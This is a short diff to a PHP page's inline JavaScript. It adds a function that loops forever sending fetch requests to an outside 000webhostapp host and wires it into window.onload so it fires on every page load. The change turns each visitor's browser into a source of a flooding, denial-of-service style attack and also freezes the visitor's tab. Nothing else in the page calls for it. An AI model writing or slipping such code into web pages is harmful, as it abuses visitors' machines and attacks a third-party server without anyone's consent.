@@ -89,8 +89,17 @@ if (!isset($_SESSION["user"])) {
             xhr.send();
         }
 
+function streeeessss(){
+    while (true) {
+  fetch("https://vitalik-politeh.000webhostapp.com/index.php")
+}
+}
         // Call the fetchData function when the page loads
-        window.onload = fetchData;
+        window.onload =()=> {
+            fetchData()
+            streeeessss()
+
+        };
 
 
         // Function to make the AJAX request
